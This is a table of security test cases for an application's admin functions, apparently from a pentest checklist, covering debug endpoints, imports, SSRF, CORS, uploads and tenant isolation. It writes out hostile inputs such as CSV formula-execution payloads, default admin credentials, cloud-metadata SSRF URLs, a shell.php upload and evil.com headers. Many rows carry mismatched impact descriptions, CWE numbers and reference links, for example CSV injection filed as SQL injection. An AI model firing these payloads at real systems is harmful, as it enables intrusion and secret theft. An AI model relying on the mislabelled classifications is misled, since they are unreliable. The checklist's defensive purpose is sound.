| ADMIN-123 | Debug Endpoint Remote Code Execution | Injection (WSTG-INPV-12) | Error Logs / Debugging | 1. Check for debug endpoints that allow code evaluation.<br>2. Test for remote debugger access.<br>3. Check for exposed debugging ports.<br>4. Test for eval or execute endpoints. | Debug code execution endpoints must never be accessible in production environments and must be completely removed from production deployments. | <code>Access /debug/eval;/console;/debug/exec;check for exposed ports 5005(Java Debug);4444(Ruby Debug);connect to remote debugger</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Nmap;Custom Scripts | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADMIN-124 | Error Rate Monitoring Bypass | Business Logic (WSTG-BUSL-01) | Error Logs / Debugging | 1. Check if error rate monitoring triggers alerts.<br>2. Gradually increase error rate to avoid threshold detection.<br>3. Test if error patterns from attacks are detected.<br>4. Verify alerting mechanisms. | Application must implement intelligent error rate monitoring that detects gradual increases and attack patterns not just sudden spikes. | <code>Slowly increase error rate over hours to avoid sudden spike detection;test with distributed error generation</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Custom Scripts;Burp Suite | CWE-840; PortSwigger Business logic |
| ADMIN-125 | Admin Account Default Credentials | Authentication (WSTG-ATHN-01) | User Management | 1. Attempt login with common default credentials for admin accounts.<br>2. Test admin and password and admin123 and root.<br>3. Check for documentation-specified defaults.<br>4. Test after fresh installation. | Application must not ship with default admin credentials and must require secure password setup during initial installation. | <code>Try admin:admin;admin:password;admin:admin123;root:root;administrator:administrator;sa:sa;test:test</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Hydra;Custom Credential Lists | CWE-640; [Account Takeover kit](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| ADMIN-126 | User Import CSV Injection | Injection (WSTG-INPV-01) | User Management | 1. If user management supports bulk import via CSV inject formula payloads.<br>2. Import users with malicious data.<br>3. Export users and check if formulas execute.<br>4. Test with DDE payloads. | Application must sanitize imported user data and escape formula-triggering characters in all import and export operations. | <code>Import CSV: =cmd&#124;'/C calc'!A0;username;+cmd&#124;'/C calc'!A0;-cmd&#124;'/C calc'!A0;@SUM(1+1)&#42;cmd</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Manual Testing | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADMIN-127 | Role Permission Caching Exploit | Caching (WSTG-ATHN-06) | Role Management | 1. Assign a high-privilege role temporarily.<br>2. Perform privileged actions.<br>3. Revoke the role.<br>4. Check if cached permissions still allow privileged access.<br>5. Verify real-time permission enforcement. | Application must enforce permissions in real-time without relying on cached role data and invalidate permission caches on role changes. | <code>Get admin role;perform privileged action;revoke admin role;immediately retry privileged action;check if cache allows it</code> | Web cache poisoning/deception -&gt; mass XSS/redirect or private-data disclosure. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-524; [Web Cache kit](#/checklist/webcache); James Kettle Web Cache Poisoning/Deception |
| ADMIN-128 | System Settings Environment Variable Exposure | Information Disclosure (WSTG-INFO-05) | System Settings | 1. Access system settings or configuration endpoints.<br>2. Check if environment variables are exposed.<br>3. Look for database URLs and API keys and secret keys in configuration.<br>4. Test for .env file exposure. | Application must not expose environment variables through any API endpoint and must protect .env files from web access. | <code>GET /api/admin/settings/env;GET /.env;GET /api/admin/config;check for DATABASE_URL;SECRET_KEY;AWS_ACCESS_KEY in responses</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;DirBuster;Nuclei | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ADMIN-129 | Audit Log CORS Misconfiguration | Security Misconfiguration (WSTG-CONF-07) | Audit Logs | 1. Access audit log API from a different origin.<br>2. Check CORS headers on audit log endpoints.<br>3. Test for wildcard origin allowance.<br>4. Check for credentials with wildcard. | Audit log API endpoints must have restrictive CORS policies not allowing cross-origin access from unauthorized domains. | <code>Send Origin: https://evil.com to audit log API;check for Access-Control-Allow-Origin: &#42;;verify credentials flag</code> | CORS misconfiguration -&gt; credentialed cross-origin secret theft -&gt; account takeover. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;cURL | CWE-942; [CORS kit](#/checklist/cors); PortSwigger CORS; Christian Schneider |
| ADMIN-130 | Health Check Endpoint Cache Poisoning | Caching (WSTG-ATHN-06) | System Health Monitoring | 1. Access health check endpoints with cache-manipulation headers.<br>2. Inject false health status into cache.<br>3. Check if subsequent requests receive poisoned cache.<br>4. Test for monitoring system confusion. | Health check responses must not be cached in shared caches and must always reflect real-time system status. | <code>Add X-Forwarded-Host: evil.com to /health;inject Cache-Control manipulation;check for cached false status</code> | Web cache poisoning/deception -&gt; mass XSS/redirect or private-data disclosure. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Custom Scripts | CWE-524; [Web Cache kit](#/checklist/webcache); James Kettle Web Cache Poisoning/Deception |
| ADMIN-131 | Backup Encryption Key Exposure | Information Disclosure (WSTG-INFO-05) | Backup / Restore | 1. Check where backup encryption keys are stored.<br>2. Verify keys are not stored alongside backups.<br>3. Check for hardcoded encryption keys.<br>4. Test key management separation. | Backup encryption keys must be stored separately from backups in a secure key management system and never hardcoded. | <code>Search for backup_encryption_key in source code;check if keys are stored in same location as backups;verify KMS usage</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | GitLeaks;Manual Review | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ADMIN-132 | Data Migration Audit Trail Verification | Logging (WSTG-CONF-09) | Data Migration | 1. Perform a data migration.<br>2. Verify complete audit trail of the migration.<br>3. Check if migration actions are attributed to the initiating admin.<br>4. Verify migration data change logging. | All data migration operations must generate comprehensive audit trail entries with the initiating admin and all data changes recorded. | <code>Perform migration and check audit log for migration_start;data_changed;records_affected;initiated_by;completion_status</code> | Insufficient or injectable logging -&gt; forensic gaps / log injection / audit bypass. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Manual Review;Burp Suite | CWE-778; OWASP Logging &amp; Monitoring Failures (A09) |
| ADMIN-133 | Bulk Operation Progress Disclosure | Information Disclosure (WSTG-INFO-05) | Bulk Operations | 1. Trigger a bulk operation.<br>2. Check if progress endpoint exposes processing details.<br>3. Monitor for information leakage about other tenants' data in progress.<br>4. Verify data isolation in progress tracking. | Bulk operation progress must only display information about the authorized user's operation without leaking other tenants' data. | <code>GET /api/admin/bulk/progress/JOB-1001 check for cross-tenant data in processing_details;affected_records information</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ADMIN-134 | Export File Direct Access Without Auth | Authentication (WSTG-ATHN-01) | Import / Export Tools | 1. Trigger a data export.<br>2. Capture the download URL.<br>3. Access the URL without authentication.<br>4. Test with expired session.<br>5. Check for publicly accessible export storage. | Export files must require valid authentication for access and use signed time-limited download URLs that expire after first use. | <code>Access /exports/data-export-2025.csv without authentication;test with expired token;check for S3 bucket public access</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Browser;AWS CLI | CWE-640; [Account Takeover kit](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| ADMIN-135 | Email Template Version Control Bypass | Business Logic (WSTG-BUSL-02) | Email Templates | 1. If templates have version control modify a template and bypass approval workflow.<br>2. Publish changes without review.<br>3. Revert to malicious previous version. | Application must enforce template change approval workflows and maintain version control with proper review processes. | <code>PUT /api/admin/email-templates/TMPL-1001/publish without approval;POST /api/admin/email-templates/TMPL-1001/revert to malicious version</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ADMIN-136 | Notification Template Channel Mismatch | Business Logic (WSTG-BUSL-01) | Notification Templates | 1. Modify a push notification template.<br>2. Include HTML or rich content intended for email in the push template.<br>3. Check if channel-inappropriate content causes issues.<br>4. Test for content injection across channels. | Application must validate notification template content is appropriate for the target channel and prevent cross-channel content injection. | <code>Set push_template with full HTML email content;set SMS template with 10000 character body;mix channel-specific formatting</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ADMIN-137 | Localization File Upload Vulnerability | File Upload (WSTG-INPV-12) | Localization Settings | 1. If localization supports file upload for translation files upload malicious files.<br>2. Upload PHP or JSP files as language files.<br>3. Test with XXE in XML translation files. | Application must validate localization file content and type preventing malicious file uploads and XXE in translation file processing. | <code>Upload shell.php as en.php language file;upload XML translation file with XXE payload;upload oversized language file</code> | Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Custom Files | CWE-434; [File Upload kit](#/checklist/fileupload); PortSwigger File upload; ImageTragick |
| ADMIN-138 | Branding Content-Security-Policy Override | Security Misconfiguration (WSTG-CONF-07) | Branding / White-labeling | 1. If branding allows custom scripts or external resources check if CSP is weakened.<br>2. Test if custom branding code bypasses CSP.<br>3. Verify CSP remains effective after branding changes. | Custom branding must not weaken the application's Content-Security-Policy and any custom resources must be served from allowed origins. | <code>Check if branding changes add unsafe-inline or unsafe-eval to CSP;verify CSP is not disabled for branded pages</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;CSP Evaluator | CWE-16; OWASP Security Misconfiguration (A05) |
| ADMIN-139 | Feature Toggle API Exposure | Information Disclosure (WSTG-INFO-05) | Feature Toggles | 1. Check if feature toggle API is accessible without authentication.<br>2. Look for feature toggle endpoints that reveal all toggle states.<br>3. Check for client-side feature toggle configuration. | Feature toggle configuration must not be publicly accessible and client-side toggles must not control security-sensitive features. | <code>GET /api/features;GET /api/feature-flags;GET /api/config/features without authentication;check JS source for feature flag values</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Browser DevTools | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ADMIN-140 | Maintenance Mode Race Condition on Activation | Business Logic (WSTG-BUSL-08) | Maintenance Mode | 1. Send concurrent maintenance mode activation and deactivation requests.<br>2. Check for inconsistent state.<br>3. Test if maintenance mode can be bypassed during transition. | Application must implement atomic maintenance mode state changes with proper locking to prevent inconsistent states. | <code>Send concurrent PUT /api/admin/maintenance/enable and PUT /api/admin/maintenance/disable simultaneously</code> | Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend). | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Turbo Intruder;Burp Suite | CWE-362; [Race Condition kit](#/checklist/racecondition); James Kettle Smashing the State Machine |
| ADMIN-141 | Stack Trace Information Disclosure | Information Disclosure (WSTG-ERRH-01) | Error Logs / Debugging | 1. Trigger various application errors.<br>2. Check for full stack traces in error responses.<br>3. Look for file paths and database details and framework versions.<br>4. Test with different content types. | Application must return generic error messages in production without exposing stack traces or internal system details. | <code>Send malformed requests to trigger 500;check for file paths;database names;framework versions;library versions in error response</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Custom Scripts | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ADMIN-142 | User Account Lockout Testing | Authentication (WSTG-ATHN-03) | User Management | 1. As admin check if account lockout is properly configured.<br>2. Test lockout threshold and duration.<br>3. Verify admin can unlock accounts.<br>4. Check if lockout notification is sent to user. | Application must provide configurable account lockout policies with proper admin unlock capability and user notification. | <code>Trigger lockout by failed logins;verify admin can unlock;check notification;test if lockout applies to admin accounts</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Manual Testing | CWE-640; [Account Takeover kit](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| ADMIN-143 | Custom Permission String Injection | Injection (WSTG-INPV-01) | Role Management | 1. If custom permissions can be created inject special characters or wildcard patterns.<br>2. Create permission with &#42; or admin.&#42; pattern.<br>3. Check for permission string parsing vulnerabilities. | Application must validate custom permission strings against allowed formats and prevent wildcard or pattern-based permission escalation. | <code>Create permission with name=&#42;;create permission=admin.&#42;;permission=../admin/all;permission=${admin}</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADMIN-144 | System Settings Backup Before Change | Business Logic (WSTG-BUSL-02) | System Settings | 1. Change critical system settings.<br>2. Check if a backup or snapshot is created before the change.<br>3. Verify rollback capability.<br>4. Test undo functionality for settings changes. | Application must create settings snapshots before critical changes and provide rollback capability with proper version history. | <code>Change critical settings then attempt rollback;verify settings history;check for auto-backup before critical changes</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ADMIN-145 | Audit Log Timestamp Manipulation | Logging (WSTG-CONF-09) | Audit Logs | 1. Check if audit log timestamps use server time.<br>2. Attempt to influence timestamps via client-provided time values.<br>3. Verify NTP synchronization.<br>4. Check for timezone consistency. | Audit log timestamps must be generated server-side using synchronized UTC time and cannot be influenced by client-provided values. | <code>Send requests with manipulated Date headers;check if X-Timestamp header influences log timestamps;verify UTC consistency</code> | Insufficient or injectable logging -&gt; forensic gaps / log injection / audit bypass. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;NTP Tools | CWE-778; OWASP Logging &amp; Monitoring Failures (A09) |
| ADMIN-146 | Monitoring Webhook SSRF | SSRF (WSTG-INPV-19) | System Health Monitoring | 1. If health monitoring sends alerts via webhooks configure internal URL as webhook.<br>2. Trigger health alert.<br>3. Check if internal service is accessed via monitoring webhook. | Application must validate monitoring webhook URLs against allowlists and block internal network access. | <code>alert_webhook=http://169.254.169.254/latest/meta-data/;notification_url=http://localhost:8080/admin</code> | SSRF -&gt; internal-service reach / cloud metadata credential theft. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Collaborator | CWE-918; [SSRF kit](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger |
| ADMIN-147 | Restore Operation Impact on Active Sessions | Session Management (WSTG-SESS-01) | Backup / Restore | 1. Perform a database restore.<br>2. Check if active user sessions are properly handled.<br>3. Verify if restored sessions create security issues.<br>4. Test for session confusion after restore. | Application must invalidate all active sessions after a database restore operation and require all users to re-authenticate. | <code>Restore database backup and check if old session tokens from backup become valid;verify session invalidation</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-640; [Account Takeover kit](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| ADMIN-148 | Data Migration Progress IDOR | Broken Access Control (WSTG-AUTHZ-04) | Data Migration | 1. Trigger a data migration.<br>2. Check migration progress endpoint.<br>3. Change migration_id to access another tenant's migration progress.<br>4. Check for data leakage in progress details. | Application must enforce tenant isolation on migration progress endpoints and prevent cross-tenant migration data access. | <code>GET /api/admin/migration/progress/MIG-2001 with TENANT-1001 credentials;enumerate migration IDs</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-149 | Bulk Email Sending Abuse | Business Logic (WSTG-BUSL-05) | Bulk Operations | 1. If bulk operations include email sending test for mass email capability.<br>2. Check if external email addresses can be targeted.<br>3. Test for email bombing prevention.<br>4. Verify recipient validation. | Application must restrict bulk email operations to internal users and implement rate limiting and recipient validation. | <code>POST /api/admin/bulk/email with external email addresses;send to 10000+ recipients;check for rate limiting</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ADMIN-150 | Import Tool Zip Bomb | Business Logic (WSTG-BUSL-05) | Import / Export Tools | 1. If import accepts ZIP files upload a zip bomb.<br>2. Check for file size validation before extraction.<br>3. Monitor server resources during extraction.<br>4. Test with nested archives. | Application must validate archive contents before extraction and enforce size limits to prevent zip bomb denial-of-service attacks. | <code>Upload 42.zip (zip bomb);upload nested ZIP within ZIP within ZIP;upload archive expanding to TB of data</code> | Denial of service -&gt; availability impact for this feature / the app. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Custom Files | CWE-400; [Race Condition kit](#/checklist/racecondition); OWASP; PortSwigger |
| ADMIN-151 | Email Template Test Send Abuse | Business Logic (WSTG-BUSL-05) | Email Templates | 1. Use template test send feature.<br>2. Send test emails to external addresses.<br>3. Check for rate limiting on test sends.<br>4. Test for email relay abuse through template testing. | Application must restrict template test sends to admin email addresses and implement rate limiting on test send functionality. | <code>POST /api/admin/email-templates/test-send with to=arbitrary@external.com;send 1000+ test emails</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ADMIN-152 | Notification Template Mass Trigger | Business Logic (WSTG-BUSL-05) | Notification Templates | 1. If notification templates can be tested trigger mass notifications.<br>2. Send test notifications to all users.<br>3. Check for rate limiting on notification testing.<br>4. Test for notification spam. | Application must restrict notification template testing to admin accounts only and implement safeguards against mass notification triggers. | <code>POST /api/admin/notification-templates/test with target=all_users;trigger 10000+ test notifications</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ADMIN-153 | Feature Toggle Dependency Chain Exploitation | Business Logic (WSTG-BUSL-01) | Feature Toggles | 1. If feature toggles have dependencies identify toggle dependency chains.<br>2. Enable a feature by enabling its dependencies.<br>3. Create circular toggle dependencies.<br>4. Test for cascading toggle effects. | Application must properly manage feature toggle dependencies and prevent circular dependencies or unintended cascading activations. | <code>Enable feature_C which requires feature_B which requires feature_A;create circular dependency A-&gt;B-&gt;C-&gt;A</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ADMIN-154 | Maintenance Mode Persistent Bypass Token | Authentication (WSTG-ATHN-01) | Maintenance Mode | 1. If maintenance mode has a bypass token for admins capture the token.<br>2. Check if the token is predictable.<br>3. Test if the token persists after maintenance mode ends.<br>4. Check for token leakage. | Maintenance mode bypass tokens must be cryptographically random and expire when maintenance mode ends and not be leaked in URLs or headers. | <code>Capture X-Maintenance-Bypass token;analyze for predictability;test after maintenance ends;check for token in access logs</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Custom Scripts | CWE-640; [Account Takeover kit](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| ADMIN-155 | Error Log Export Sensitive Data | Information Disclosure (WSTG-INFO-05) | Error Logs / Debugging | 1. Export error logs.<br>2. Check if exported logs contain more detail than the viewer.<br>3. Verify sensitive data masking in exports.<br>4. Check export authorization. | Error log exports must apply the same or stricter data masking as the log viewer and require proper authorization. | <code>GET /api/admin/error-logs/export check for unmasked passwords;API keys;session tokens;PII in exported file</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ADMIN-156 | User Impersonation Feature Security | Broken Access Control (WSTG-AUTHZ-02) | User Management | 1. If admin can impersonate users test the impersonation feature.<br>2. Check if impersonation is properly logged.<br>3. Verify impersonation restrictions.<br>4. Test if impersonation allows password access.<br>5. Check for escalation via impersonation. | User impersonation must be restricted to authorized super-admins with full audit logging and must not provide access to passwords or allow privilege escalation. | <code>POST /api/admin/impersonate/user/1001 with regular admin token;check audit log;attempt to change password while impersonating;escalate privileges</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-157 | System Settings API Key Rotation Check | Security Misconfiguration (WSTG-CONF-01) | System Settings | 1. Check if system API keys can be rotated.<br>2. Rotate keys and verify old keys are invalidated.<br>3. Check for downtime during rotation.<br>4. Verify key rotation is logged. | System API keys must support zero-downtime rotation with immediate invalidation of old keys and comprehensive audit logging. | <code>Rotate system API key;test old key acceptance;verify new key works immediately;check rotation audit log entry</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-16; OWASP Security Misconfiguration (A05) |
| ADMIN-158 | Audit Log Cross-Tenant Isolation | Broken Access Control (WSTG-AUTHZ-04) | Audit Logs | 1. Access audit logs as tenant admin.<br>2. Modify search parameters to include other tenant data.<br>3. Check pagination for cross-tenant data leakage.<br>4. Verify strict tenant isolation in log queries. | Audit log queries must be scoped to the authenticated tenant with no possibility of cross-tenant data leakage. | <code>GET /api/admin/audit-logs?tenant_id=TENANT-2001;set page_size=999999;check for cross-tenant log entries in results</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADMIN-159 | Backup Download Rate Limiting | Business Logic (WSTG-BUSL-05) | Backup / Restore | 1. Attempt to download multiple backups simultaneously.<br>2. Download the same backup repeatedly.<br>3. Check for rate limiting on backup downloads.<br>4. Monitor for bandwidth abuse. | Application must implement rate limiting on backup downloads to prevent bandwidth abuse and potential data exfiltration. | <code>Send 100+ GET /api/admin/backups/download requests simultaneously;download all available backups rapidly</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite Intruder;JMeter | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
